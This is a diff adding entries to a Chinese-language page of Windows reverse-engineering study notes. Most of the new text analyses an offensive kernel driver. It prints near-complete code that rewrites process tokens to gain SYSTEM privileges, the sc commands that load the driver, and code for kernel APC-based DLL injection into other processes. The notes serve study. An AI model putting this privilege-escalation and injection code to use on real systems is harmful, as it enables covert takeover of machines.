@@ -80,6 +80,7 @@
               {title: "controlfp", url: "#controlfp" },
               {title: "_iob_func", url: "#_iob_func" },
               {title: "_InterlockedCompareExchange64", url: "#_interlockedcompareexchange64" },
+              {title: "RtlGetVersion", url: "#rtlgetversion" },
           ]},
           {title: "SEH", url: "#seh_1", children: [
           ]},
@@ -108,6 +109,7 @@
           {title: "\u5de5\u5177", url: "#_51", children: [
               {title: "boofuzz\u4f7f\u7528", url: "#boofuzz" },
               {title: "x64dbg\u5b89\u88c5mona\u63d2\u4ef6", url: "#x64dbgmona" },
+              {title: "speakeasy", url: "#speakeasy_1" },
           ]},
           {title: "\u4e66\u7c4d", url: "#_52", children: [
           ]},
@@ -1297,6 +1299,28 @@ XOR  异或，相同为0，不同为1
 <p><code>LONG64 _InterlockedCompareExchange64(LONG64 volatile* Destination, LONG64 Exchange, LONG64 Comparand);</code></p>
 <p>当第一个参数Destination等于第三个参数Comparand时，将第一个参数替换为第二个参数Exchange。</p>
 <p>确保Destination的值和Exchange相等</p>
+<h3 id="rtlgetversion">RtlGetVersion</h3>
+<p>RtlGetVersion 函数是 Windows 内核 API 中的一个函数，用于获取有关当前运行的操作系统的版本信息。它是 GetVersionEx 函数的内核模式等价物。</p>
+<pre><code class="language-C">NTSTATUS RtlGetVersion(
+  _Out_ PRTL_OSVERSIONINFOW lpVersionInformation
+);
+</code></pre>
+<p>用法</p>
+<pre><code class="language-c">RTL_OSVERSIONINFOW osvi;
+osvi.dwOSVersionInfoSize = sizeof(osvi);
+
+NTSTATUS status = RtlGetVersion(&amp;osvi);
+
+if (NT_SUCCESS(status)) {
+  printf(&quot;Major version: %u\n&quot;, osvi.dwMajorVersion);
+  printf(&quot;Minor version: %u\n&quot;, osvi.dwMinorVersion);
+  printf(&quot;Build number: %u\n&quot;, osvi.dwBuildNumber);
+  printf(&quot;Service pack: %u\n&quot;, osvi.szCSDVersion[0]);
+} else {
+  printf(&quot;Failed to get OS version information\n&quot;);
+}
+
+</code></pre>
 <h2 id="seh_1">SEH</h2>
 <p>__except 异常过滤器的返回值</p>
 <pre><code class="language-C">EXCEPTION_EXECUTE_HANDLER   //EXCEPTION_EXECUTE_HANDLER的返回值向SEH发出信号，以执行__except块中的代码。
@@ -2104,6 +2128,570 @@ LAB_00017f58:
 <img alt="" src="../../images/Snipaste_2023-12-14_16-13-31.jpg" /></p>
 <p>在<code>ProcessBlockRoutine</code>函数调用前下断点，可以看到当前传入的变量
 <img alt="" src="../../images/Snipaste_2023-12-14_16-44-27.jpg" /></p>
+<h4 id="getfullprivs">GetFullPrivs</h4>
+<p>这个功能可以提权到<code>system</code></p>
+<p>添加服务</p>
+<pre><code>sc create GetFullPrivs binPath= C:\Users\admin\Desktop\GetFullPrivsDrv.sys type= kernel
+sc start GetFullPrivs
+</code></pre>
+<p>以<code>system</code>开启了<code>cmd</code>
+<img alt="" src="../../images/Snipaste_2023-12-18_11-32-48.jpg" /></p>
+<p>重复的加载驱动卸载驱动就不看了，直接看看功能不同的地方。</p>
+<p>初始化</p>
+<pre><code class="language-C">    do
+    {
+        RTL_OSVERSIONINFOW versionInfo{ 0 };
+        UNICODE_STRING devicePath = RTL_CONSTANT_STRING(DEVICE_PATH);
+        UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);
+
+        ntstatus = ::RtlGetVersion(&amp;versionInfo);   //使用RtlGetVersion获取系统版本信息，结果返回给versionInfo结构体
+
+        if (!NT_SUCCESS(ntstatus))      //版本获取失败的处理
+        {
+            KdPrint((DRIVER_PREFIX &quot;Failed to get OS version information (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
+            break;
+        }
+        else           //获取成功打印获取的版本信息
+        {
+            KdPrint((DRIVER_PREFIX &quot;OS Version - %u.%u.%u\n&quot;,
+                versionInfo.dwMajorVersion,
+                versionInfo.dwMinorVersion,
+                versionInfo.dwBuildNumber));
+
+            // _SEP_TOKEN_PRIVILEGES was introduced since Windows Vista
+            //根据不同系统版本版本设定值
+            //https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfoexw
+
+            if ((versionInfo.dwMajorVersion == 6))   
+            {
+                if (versionInfo.dwMinorVersion &lt; 2)
+                {
+                    // From Windows Vista to Windows 7 SP1
+                    g_PrivilegesOffset = 0x40u;
+                    g_UserAndGroupCountOffset = 0x78u;
+                    g_UserAndGroupsOffset = 0x90u;
+                    g_TokenFlagsOffset = 0xC0u;
+                    g_IntegrityLevelIndexOffset = 0xC8u;
+                }
+                else
+                {
+                    // From Windows 8 to Windows 8.1
+                    g_PrivilegesOffset = 0x40u;
+                    g_UserAndGroupCountOffset = 0x7Cu;
+                    g_UserAndGroupsOffset = 0x98u;
+                    g_TokenFlagsOffset = 0xC8u;
+                    g_IntegrityLevelIndexOffset = 0xD0u;
+                }
+            }
+            else if (versionInfo.dwMajorVersion == 10)
+            {
+                // From Windows 10 1509 to Windows 11 23H2
+                g_PrivilegesOffset = 0x40u;
+                g_UserAndGroupCountOffset = 0x7Cu;
+                g_UserAndGroupsOffset = 0x98u;
+                g_TokenFlagsOffset = 0xC8u;
+                g_IntegrityLevelIndexOffset = 0xD0u;
+            }
+            else
+            {
+                // Older than Windows Vista does not have _SEP_TOKEN_PRIVILEGE
+                ntstatus = STATUS_NOT_SUPPORTED;
+                KdPrint((DRIVER_PREFIX &quot;Unsupported OS version is detected.\n&quot;));
+                break;
+            }
+
+        }
+
+        ntstatus = ::IoCreateDevice(
+            DriverObject,
+            NULL,
+            &amp;devicePath,
+            FILE_DEVICE_UNKNOWN,
+            NULL,
+            FALSE,
+            &amp;pDeviceObject);
+
+        if (!NT_SUCCESS(ntstatus))
+        {
+            pDeviceObject = nullptr;
+            KdPrint((DRIVER_PREFIX &quot;Failed to create device (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
+            break;
+        }
+
+        //符号创建成功时
+        ntstatus = ::IoCreateSymbolicLink(&amp;symlinkPath, &amp;devicePath);
+
+        if (!NT_SUCCESS(ntstatus))
+        {
+            KdPrint((DRIVER_PREFIX &quot;Failed to create symbolic link (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
+            break;
+        }
+        //设定驱动的各种操作函数
+        DriverObject-&gt;DriverUnload = DriverUnload;
+        DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
+        DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
+        DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;
+
+        KdPrint((DRIVER_PREFIX &quot;Driver is loaded successfully.\n&quot;));
+    } while (false);
+
+    if (!NT_SUCCESS(ntstatus) &amp;&amp; (pDeviceObject != nullptr))
+        ::IoDeleteDevice(pDeviceObject);
+
+    return ntstatus;
+}
+</code></pre>
+<p>核心功能块</p>
+<p>代码分段1</p>
+<pre><code class="language-C">PEPROCESS pEprocess = nullptr;
+auto pid = ::ULongToHandle(*(ULONG*)Irp-&gt;AssociatedIrp.SystemBuffer);
+ntstatus = ::PsLookupProcessByProcessId(pid, &amp;pEprocess);
+</code></pre>
+<p>初始化<code>pEprocess</code>结构体，将请求的进程转换为<code>handle</code>，使用<code>PsLookupProcessByProcessId</code>查询指定<code>PID</code>的<code>pEprocess</code>存到<code>ntstatus</code></p>
+<p><code>_KPROCESS</code>和<code>_eprocess</code>是存储进程信息的结构体，分别表示内核模式下和用户模式下的进程信息。</p>
+<p>wwindbg调试
+查找指定进程的<code>_eprocess</code>地址</p>
+<pre><code class="language-C">1: kd&gt; !process 1be0 0
+Searching for Process with Cid == 1be0
+PROCESS ffff8f0f4d1ab080
+    SessionId: 1  Cid: 1be0    Peb: 02768000  ParentCid: 04ac
+    DirBase: 496ad000  ObjectTable: ffff9f07935a1a00  HandleCount:  94.
+    Image: cmd.exe
+</code></pre>
+<p>代码分段2</p>
+<pre><code class="language-C">PACCESS_TOKEN pPrimaryToken = ::PsReferencePrimaryToken(pEprocess);
+//根据eprocess获取PrimaryToken地址，即_token结构体
+
+auto pSepToken = (PSEP_TOKEN_PRIVILEGES)((ULONG_PTR)pPrimaryToken + g_PrivilegesOffset);
+//根据token获取Privileges
+
+auto nUserAndGroupCount = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupCountOffset);
+//根据token获取UserAndGroupCount
+
+auto pUserAndGroups = *(PSID_AND_ATTRIBUTES*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupsOffset);
+//根据token获取UserAndGroups
+
+auto nIntegrityLevelIndex = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_IntegrityLevelIndexOffset);`
+//根据token获取IntegrityLevelIndex
+
+
+//修改令牌权限
+pSepToken-&gt;Present = VALID_PRIVILEGE_MASK;    //Present指示哪些特权在令牌中存在
+pSepToken-&gt;Enabled = VALID_PRIVILEGE_MASK;    //Enabled指示哪些特权被激活，进程可自定义
+pSepToken-&gt;EnabledByDefault = VALID_PRIVILEGE_MASK;   //EnabledByDefault指示哪些特权默认被激活，进程无需定义可直接使用
+
+//修改`SID`结构体的`SubAuthority`第一个元素为`0x4000`
+auto pSid = (PISID)pUserAndGroups[nIntegrityLevelIndex].Sid;
+pSid-&gt;SubAuthority[0] = 0x4000;
+
+KdPrint((DRIVER_PREFIX &quot;Integrity level of PID %u is modified to System level.\n&quot;, HandleToULong(pid)));
+</code></pre>
+<p>看<code>token</code>结构体，核心功能代码基本都是对<code>token</code>进行修改以实现<code>SYSTEM</code></p>
+<pre><code class="language-C">1: kd&gt; dt _token
+nt!_TOKEN
+   +0x000 TokenSource      : _TOKEN_SOURCE
+   +0x010 TokenId          : _LUID
+   +0x018 AuthenticationId : _LUID
+   +0x020 ParentTokenId    : _LUID
+   +0x028 ExpirationTime   : _LARGE_INTEGER
+   +0x030 TokenLock        : Ptr64 _ERESOURCE
+   +0x038 ModifiedId       : _LUID
+   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES  //g_PrivilegesOffset的值
+   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
+   +0x078 SessionId        : Uint4B
+   +0x07c UserAndGroupCount : Uint4B           //g_UserAndGroupCountOffset的值
+   +0x080 RestrictedSidCount : Uint4B
+   +0x084 VariableLength   : Uint4B
+   +0x088 DynamicCharged   : Uint4B
+   +0x08c DynamicAvailable : Uint4B
+   +0x090 DefaultOwnerIndex : Uint4B
+   +0x098 UserAndGroups    : Ptr64 _SID_AND_ATTRIBUTES  //g_UserAndGroupsOffset的值
+   +0x0a0 RestrictedSids   : Ptr64 _SID_AND_ATTRIBUTES
+   +0x0a8 PrimaryGroup     : Ptr64 Void
+   +0x0b0 DynamicPart      : Ptr64 Uint4B
+   +0x0b8 DefaultDacl      : Ptr64 _ACL
+   +0x0c0 TokenType        : _TOKEN_TYPE
+   +0x0c4 ImpersonationLevel : _SECURITY_IMPERSONATION_LEVEL
+   +0x0c8 TokenFlags       : Uint4B             //g_TokenFlagsOffset的值
+   +0x0cc TokenInUse       : UChar
+   +0x0d0 IntegrityLevelIndex : Uint4B          //g_IntegrityLevelIndexOffset的值
+   +0x0d4 MandatoryPolicy  : Uint4B
+   +0x0d8 LogonSession     : Ptr64 _SEP_LOGON_SESSION_REFERENCES
+   +0x0e0 OriginatingLogonSession : _LUID
+   +0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH
+   +0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
+   +0x308 pSecurityAttributes : Ptr64 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
+   +0x310 Package          : Ptr64 Void
+   +0x318 Capabilities     : Ptr64 _SID_AND_ATTRIBUTES
+   +0x320 CapabilityCount  : Uint4B
+   +0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
+   +0x438 LowboxNumberEntry : Ptr64 _SEP_LOWBOX_NUMBER_ENTRY
+   +0x440 LowboxHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
+   +0x448 pClaimAttributes : Ptr64 _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION
+   +0x450 TrustLevelSid    : Ptr64 Void
+   +0x458 TrustLinkedToken : Ptr64 _TOKEN
+   +0x460 IntegrityLevelSidValue : Ptr64 Void
+   +0x468 TokenSidValues   : Ptr64 _SEP_SID_VALUES_BLOCK
+   +0x470 IndexEntry       : Ptr64 _SEP_LUID_TO_INDEX_MAP_ENTRY
+   +0x478 DiagnosticInfo   : Ptr64 _SEP_TOKEN_DIAG_TRACK_ENTRY
+   +0x480 BnoIsolationHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
+   +0x488 SessionObject    : Ptr64 Void
+   +0x490 VariablePart     : Uint8B
+</code></pre>
+<p>查看一下进程实际的值。
+首先找到token结构体地址</p>
+<pre><code class="language-C">1: kd&gt; !process 1be0 3
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-12-18_16-05-43.jpg" /></p>
+<p>在<code>0x40</code>偏移量处找到了<code>pPrimaryToken + g_PrivilegesOffset</code>的值
+套到<code>_SEP_TOKEN_PRIVILEGES</code>结构体更加直观的展示</p>
+<p>和代码中定义的值是一样的</p>
+<pre><code class="language-C">#define VALID_PRIVILEGE_MASK 0x0000001FFFFFFFFCULL
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-12-18_16-09-20.jpg" /></p>
+<p>在<code>0x7c</code>偏移量找到<code>pPrimaryToken + g_UserAndGroupCountOffset</code>的值
+<img alt="" src="../../images/Snipaste_2023-12-18_17-04-59.jpg" /></p>
+<p>在<code>0x98</code>偏移量找到<code>pPrimaryToken + g_UserAndGroupsOffset</code>的值
+代码已经修改了<code>SID</code>的<code>SubAuthority</code>的值。只能显示整个<code>SID</code>
+<img alt="" src="../../images/Snipaste_2023-12-18_17-06-17.jpg" /></p>
+<p>在<code>0xd0</code>偏移量找到<code>pPrimaryToken + g_IntegrityLevelIndexOffset</code>的值
+<img alt="" src="../../images/Snipaste_2023-12-18_17-08-37.jpg" /></p>
+<p>代码分段3
+此处循环修改<code>IdentifierAuthority</code>，将<code>sid</code>修改为<code>system</code>用户的</p>
+<pre><code class="language-C">            for (auto idx = 0u; idx &lt; nUserAndGroupCount; idx++)
+            {
+                // Overwrite token user to &quot;NT AUTHORITY\SYSTEM&quot;
+                if (pUserAndGroups[idx].Attributes == 0)
+                {
+                    pSid = (PISID)pUserAndGroups[idx].Sid;
+
+                    for (auto offset = 1; offset &lt; pSid-&gt;SubAuthorityCount; offset++)
+                        pSid-&gt;SubAuthority[offset] = 0;
+
+                    pSid-&gt;SubAuthorityCount = 1;
+                    pSid-&gt;IdentifierAuthority.Value[0] = 0;
+                    pSid-&gt;IdentifierAuthority.Value[1] = 0;
+                    pSid-&gt;IdentifierAuthority.Value[2] = 0;
+                    pSid-&gt;IdentifierAuthority.Value[3] = 0;
+                    pSid-&gt;IdentifierAuthority.Value[4] = 0;
+                    pSid-&gt;IdentifierAuthority.Value[5] = 5;
+                    pSid-&gt;SubAuthority[0] = 18;
+
+                    KdPrint((DRIVER_PREFIX &quot;Token user of PID %u is modified to \&quot;NT AUTHORITY\\SYSTEM\&quot;.\n&quot;, HandleToULong(pid)));
+                    break;
+                }
+            }
+</code></pre>
+<p>代码分段4
+修改<code>pPrimaryToken + g_TokenFlagsOffset</code>，修改<code>TokenFlags</code>为<code>system</code>的</p>
+<pre><code class="language-C">*(ULONG*)((ULONG_PTR)pPrimaryToken + g_TokenFlagsOffset) = 0x00002800u;
+
+::PsDereferencePrimaryToken(pPrimaryToken);
+ObDereferenceObject(pEprocess);
+</code></pre>
+<p>在<code>0xc8</code>偏移量找到<code>pPrimaryToken + g_TokenFlagsOffset</code>的值
+<img alt="" src="../../images/Snipaste_2023-12-18_17-13-20.jpg" />
+这时进程已经是<code>system</code>了。</p>
+<p>总体来说，实现原理是先获取进程的<code>eprocess</code>，再根据<code>eprocess</code>获取<code>_token</code>结构体地址，修改<code>_token</code>中的<code>Privileges</code>、<code>TokenFlags</code>、<code>UserAndGroups</code>实现最高权限。</p>
+<p><code>exe</code>的调用逻辑是获取自身进程的信息，调用驱动修改自身进程的权限，然后创建一个当前权限的新程序。
+在windbg中可以证实这一点。
+<img alt="" src="../../images/Snipaste_2023-12-18_17-43-48.jpg" />
+<img alt="" src="../../images/Snipaste_2023-12-18_17-44-15.jpg" />
+<img alt="" src="../../images/Snipaste_2023-12-18_17-45-57.jpg" /></p>
+<p>稍微改下，提升别的进程权限
+<img alt="" src="../../images/Snipaste_2023-12-18_17-50-08.jpg" /></p>
+<h4 id="getprochandle">GetProcHandle</h4>
+<p>这个功能是获取进程句柄，由于是内核级别，所以可以获取任意进程句柄。
+代码是直接使用<code>ZwOpenProcess</code>打开进程获取句柄了</p>
+<pre><code class="language-C">        ntstatus = ::ZwOpenProcess(
+            &amp;hProcess,
+            PROCESS_ALL_ACCESS,
+            &amp;objectAttributes,
+            &amp;clientId);
+
+        if (!NT_SUCCESS(ntstatus))
+        {
+            *(HANDLE*)Irp-&gt;AssociatedIrp.SystemBuffer = nullptr;
+            KdPrint((DRIVER_PREFIX &quot;Failed to ZwOpenProcess() (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
+            break;
+        }
+
+        *(HANDLE*)Irp-&gt;AssociatedIrp.SystemBuffer = hProcess;
+        info = sizeof(HANDLE);
+        KdPrint((DRIVER_PREFIX &quot;ZwOpenProcess() is successful.\n&quot;));
+    }
+
+    Irp-&gt;IoStatus.Status = ntstatus;
+    Irp-&gt;IoStatus.Information = info;
+    IoCompleteRequest(Irp, 0);
+
+    return ntstatus;
+</code></pre>
+<h4 id="injectlibrary">InjectLibrary</h4>
+<p>向进程注入dll</p>
+<p><img alt="" src="../../images/Snipaste_2024-01-08_14-04-53.jpg" /></p>
+<p>从<code>OnDeviceControl</code>函数的整个流程来看，sys驱动的详细工作是在system权限下将dll符加到了当前进程，然后根据驱动调用程序指定的目标进程，将dll复制到了目标进程的内存空间，使用内核模式下的APC将dll加入了APC队列并调用。</p>
+<pre><code class="language-C">        //为内核模式的APC分配内存空间
+        pKapc = (PKAPC)::ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), (ULONG)DRIVER_TAG);
+
+        if (pKapc == nullptr)
+        {
+            KdPrint((DRIVER_PREFIX &quot;Failed to allocate non-paged pool for _KAPC.\n&quot;));
+            break;
+        }
+        else
+        {
+            KdPrint((DRIVER_PREFIX &quot;Non-paged pool for _KAPC is allocated at 0x%p.\n&quot;, pKapc));
+        }
+
+        //自定义函数GetLdrLoadDllAddress()，从ntdll中获取LdrLoadDll()函数地址，LdrLoadDll用于加载dll
+        if (LdrLoadDll == nullptr)
+            LdrLoadDll = (PLdrLoadDll)GetLdrLoadDllAddress();
+
+        if (LdrLoadDll == nullptr)
+        {
+            KdPrint((DRIVER_PREFIX &quot;Failed to get LdrLoadDll() address.\n&quot;));
+            break;
+        }
+        else
+        {
+            KdPrint((DRIVER_PREFIX &quot;LdrLoadDll() is at 0x%p.\n&quot;, (PVOID)LdrLoadDll));
+        }
+
+        //通过线程ID查找线程，返回句柄
+        ntstatus = ::PsLookupThreadByThreadId(ULongToHandle(pContext-&gt;ThreadId), &amp;pThread);
+
+        if (!NT_SUCCESS(ntstatus))
+        {
+            pThread = nullptr;
+            KdPrint((DRIVER_PREFIX &quot;Failed to lookup nt!_ETHREAD for thread ID %u (NTSTATUS = 0x%08X).\n&quot;,
+                pContext-&gt;ThreadId,
+                ntstatus));
+            break;
+        }
+        else
+        {
+            KdPrint((DRIVER_PREFIX &quot;nt!_ETHREAD for thread ID %u is at 0x%p.\n&quot;, pContext-&gt;ThreadId, pThread));
+        }
+
+        //通过线程句柄获取进程id
+        clientId.UniqueProcess = ::PsGetThreadProcessId(pThread);
+
+        //接着打开进程，获取进程句柄
+        ntstatus = ::ZwOpenProcess(
+            &amp;hProcess,
+            PROCESS_ALL_ACCESS,
+            &amp;objectAttributes,
+            &amp;clientId);
+
+        if (!NT_SUCCESS(ntstatus))
+        {
+            hProcess = nullptr;
+            KdPrint((DRIVER_PREFIX &quot;Failed to lookup get process handle of thread (NTSTATUS = 0x%08X).\n&quot;, ntstatus));
+            break;
+        }
+        else
+        {
+            KdPrint((DRIVER_PREFIX &quot;Got process handle for PID %u.\n&quot;, HandleToULong(clientId.UniqueProcess)));
+        }
+
+        //在进程中分配内存空间
+        ntstatus = ::ZwAllocateVirtualMemory(
+            hProcess,
+            &amp;pPathBuffer,
+            NULL,
+            &amp;nBufferSize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE);
+
+        if (!NT_SUCCESS(ntstatus))
+        {
+            pPathBuffer = nullptr;
+            KdPrint((DRIVER_PREFIX &quot;Failed to allocate buffer in PID %u (NTSTATUS = 0x%08X).\n&quot;,
+                HandleToULong(clientId.UniqueProcess),
+                ntstatus));
+            break;
+        }
+        else
+        {
+
+            //使用当前线程加载dll，然后将当前线程附加到目标进程中，将dll复制到目标进程所分配的内存空间
+            KdPrint((DRIVER_PREFIX &quot;%u bytes buffer is allocate at 0x%p in PID %u.\n&quot;,
+                HandleToULong((HANDLE)nBufferSize),
+                pPathBuffer,
+                HandleToULong(clientId.UniqueProcess)));
+
+            // Write DLL path (_UNICODE_STRING) in the target thread memory.
+            ::KeStackAttachProcess(::PsGetThreadProcess(pThread), &amp;apcState);
+
+            auto pLibraryPath = (PUNICODE_STRING)pPathBuffer;
+            pLibraryPath-&gt;MaximumLength = (USHORT)(sizeof(WCHAR) * 256);
+            pLibraryPath-&gt;Buffer = (PWCH)((ULONG_PTR)pPathBuffer + sizeof(UNICODE_STRING));
+            ::memcpy(pLibraryPath-&gt;Buffer, &amp;pContext-&gt;LibraryPath, sizeof(WCHAR) * 256);
+            ((WCHAR*)pLibraryPath-&gt;Buffer)[256] = NULL; // ensure null-terminator for wcslen()
+            pLibraryPath-&gt;Length = (USHORT)(sizeof(WCHAR) * ::wcslen(pLibraryPath-&gt;Buffer));
+
+            KdPrint((DRIVER_PREFIX &quot;Library to inject: %wZ.\n&quot;, pPathBuffer));
+
+            ::KeUnstackDetachProcess(&amp;apcState);
+        }
+
+        //初始化APC对象
+        KeInitializeApc(
+            pKapc,
+            pThread,
+            OriginalApcEnvironment,
+            ApcRoutine,
+            nullptr,
+            (PKNORMAL_ROUTINE)LdrLoadDll,
+            UserMode,
+            nullptr);
+
+        //将进程中的内存空间插入APC
+        if (KeInsertQueueApc(pKapc, nullptr, pPathBuffer, IO_NO_INCREMENT))
+        {
+            KdPrint((DRIVER_PREFIX &quot;APC queue is inserted successfully.\n&quot;));
+            KeAlertThread(pThread, UserMode);
+        }
+        else
+        {
+            KdPrint((DRIVER_PREFIX &quot;Failed to insert APC queue.\n&quot;));
+        }
+    }
+
+    //至此dll已经加载完成，后面是释放空间的代码
+    if (!NT_SUCCESS(ntstatus) &amp;&amp; (pKapc != nullptr))
+        ::ExFreePoolWithTag(pKapc, (ULONG)DRIVER_TAG);
+
+    if (hProcess != nullptr)
+    {
+        if (!NT_SUCCESS(ntstatus) &amp;&amp; (pPathBuffer != nullptr))
+            ::ZwFreeVirtualMemory(hProcess, &amp;pPathBuffer, &amp;nBufferSize, MEM_RELEASE);
+
+        ::ZwClose(hProcess);
+    }
+
+    if (pThread != nullptr)
+        ObDereferenceObject(pThread);
+
+    Irp-&gt;IoStatus.Status = ntstatus;
+    Irp-&gt;IoStatus.Information = info;
+    IoCompleteRequest(Irp, 0);
+
+    return ntstatus;
+</code></pre>
+<p>在C#的调用程序中，要么指定现有进程的tid，要么指定开启一个新进程</p>
+<pre><code class="language-c">                    if (threadId &gt; 0)
+                        Modules.InjectDll(threadId, options.GetValue(&quot;library&quot;));
+                }
+                else
+                {
+                    Modules.InjectDllWithCommand(options.GetValue(&quot;command&quot;), options.GetValue(&quot;library&quot;));
+                }
+</code></pre>
+<p>自定义的结构体<code>INJECT_CONTEXT</code>存储传入的参数</p>
+<pre><code class="language-C">        public INJECT_CONTEXT(int threadId, string libraryPath)
+        {
+            ThreadId = (uint)threadId;
+            LibraryPath = new byte[512];
+
+            if (!string.IsNullOrEmpty(libraryPath))
+            {
+                var pathBytes = Encoding.Unicode.GetBytes(libraryPath);
+                var nCopyLength = (pathBytes.Length &lt; 512) ? pathBytes.Length : 512;
+                Buffer.BlockCopy(pathBytes, 0, LibraryPath, 0, nCopyLength);
+            }
+        }
+</code></pre>
+<p>使用<code>StructureToPtr</code>将结构体转换为指针，调用<code>NtDeviceIoControlFile</code>函数，完成驱动通信</p>
+<pre><code class="language-C">       public static bool InjectDll(int threadId, string dllPath)
+       {
+           NTSTATUS ntstatus;
+           IntPtr pInBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(INJECT_CONTEXT)));
+           var context = new INJECT_CONTEXT(threadId, Path.GetFullPath(dllPath));
+
+           Console.WriteLine(&quot;[*] Injection target information:&quot;);
+           Console.WriteLine(&quot;    [*] Thread ID    : {0}&quot;, context.ThreadId);
+           Console.WriteLine(&quot;    [*] Library Path : {0}&quot;, Encoding.Unicode.GetString(context.LibraryPath).TrimEnd('\0'));
+
+           Marshal.StructureToPtr(context, pInBuffer, true);
+
+           Console.WriteLine(&quot;[&gt;] Sending a query to {0}.&quot;, Globals.SYMLINK_PATH);
+
+           do
+           {
+               IntPtr hDevice;
+
+               using (var objectAttributes = new OBJECT_ATTRIBUTES(
+                   Globals.SYMLINK_PATH,
+                   OBJECT_ATTRIBUTES_FLAGS.OBJ_CASE_INSENSITIVE))
+               {
+                   ntstatus = NativeMethods.NtCreateFile(
+                       out hDevice,
+                       ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
+                       in objectAttributes,
+                       out IO_STATUS_BLOCK _,
+                       IntPtr.Zero,
+                       FILE_ATTRIBUTE_FLAGS.NORMAL,
+                       FILE_SHARE_ACCESS.NONE,
+                       FILE_CREATE_DISPOSITION.OPEN,
+                       FILE_CREATE_OPTIONS.NON_DIRECTORY_FILE,
+                       IntPtr.Zero,
+                       0u);
+               }
+
+               if (ntstatus != Win32Consts.STATUS_SUCCESS)
+               {
+                   Console.WriteLine(&quot;[-] Failed to open {0} (NTSTATUS = 0x{1}).&quot;, Globals.SYMLINK_PATH, ntstatus.ToString(&quot;X8&quot;));
+                   break;
+               }
+               else
+               {
+                   Console.WriteLine(&quot;[+] Got a handle to {0} (Handle = 0x{1})&quot;, Globals.SYMLINK_PATH, hDevice.ToString(&quot;X&quot;));
+               }
+
+               ntstatus = NativeMethods.NtDeviceIoControlFile(
+                   hDevice,
+                   IntPtr.Zero,
+                   IntPtr.Zero,
+                   IntPtr.Zero,
+                   out IO_STATUS_BLOCK _,
+                   Globals.IOCTL_INJECT_LIBRARY,
+                   pInBuffer,
+                   (uint)Marshal.SizeOf(typeof(INJECT_CONTEXT)),
+                   IntPtr.Zero,
+                   0u);
+               NativeMethods.NtClose(hDevice);
+
+               if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                   Console.WriteLine(&quot;[-] Failed to NtDeviceIoControlFile() (NTSTATUS = 0x{0}).&quot;, ntstatus.ToString(&quot;X8&quot;));
+               else
+                   Console.WriteLine(&quot;[+] DLL injection would be successful.&quot;);
+           } while (false);
+
+           Marshal.FreeHGlobal(pInBuffer);
+
+           Console.WriteLine(&quot;[*] Done.&quot;);
+
+           return (ntstatus == Win32Consts.STATUS_SUCCESS);
+</code></pre>
+<p>为什么在驱动中定义的<code>IOCTL</code>编号和驱动调用的不一样？</p>
+<p>sys文件中的
+<code>#define IOCTL_INJECT_LIBRARY CTL_CODE(0x8000, 0x0600, METHOD_BUFFERED, FILE_ANY_ACCESS)</code></p>
+<p>c#调用的
+<code>public static uint IOCTL_INJECT_LIBRARY { get; } = 0x80001800u;</code></p>
+<p>这是因为在c中使用了<code>CTL_CODE</code>宏来定义<code>IOCTL</code>。</p>
+<p><code>IOCTL</code>是一个32位的值，由两部分组成，分操作代码和参数。
+c里面使用了宏<code>CTL_CODE</code>来分别指定不同的部分，而c#没有宏可以使用，所以指定指定单个值<code>0x80001800u</code></p>
+<pre><code class="language-C">#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
+    ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \
+)
+</code></pre>
+<h4 id="modhide">ModHide</h4>
+<h4 id="prochide">ProcHide</h4>
+<h4 id="procprotect">ProcProtect</h4>
+<h4 id="querymodule">QueryModule</h4>
+<h4 id="stealtoken">StealToken</h4>
 <h2 id="windbg">Windbg</h2>
 <p>https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/commands</p>
 <p>https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/standard-debugging-techniques</p>
@@ -2112,6 +2700,13 @@ LAB_00017f58:
 <li>.process 查看进程信息</li>
 </ul>
 <pre><code>.process 0 0 cmd.exe    查找进程
+</code></pre>
+<ul>
+<li>dt 查看结构体</li>
+</ul>
+<pre><code>dt xxxx   查看当前结构体
+dt xxx!xxx  查看指定模块的结构体
+dt _peb @$peb 将值应用到结构体
 </code></pre>
 <ul>
 <li>lm 查看模块</li>
@@ -2319,6 +2914,7 @@ Mapping activation context regions...
 <pre><code>\\.\pipe\pa
 
 bcdedit /debug on
+bcdedit /dbgsettings serial debugport:2 baudrate:115200
 
 bcdedit /dbgsettings NET HOSTIP:1.1.1.1 PORT:50000
 
@@ -2459,6 +3055,52 @@ https://github.com/x64dbg/x64dbgpylib
 
 clean_mona.py复制到x64dbgpy/x64dbgpy/autorun中
 
+</code></pre>
+<h2 id="speakeasy_1">speakeasy</h2>
+<p>模拟shellcode</p>
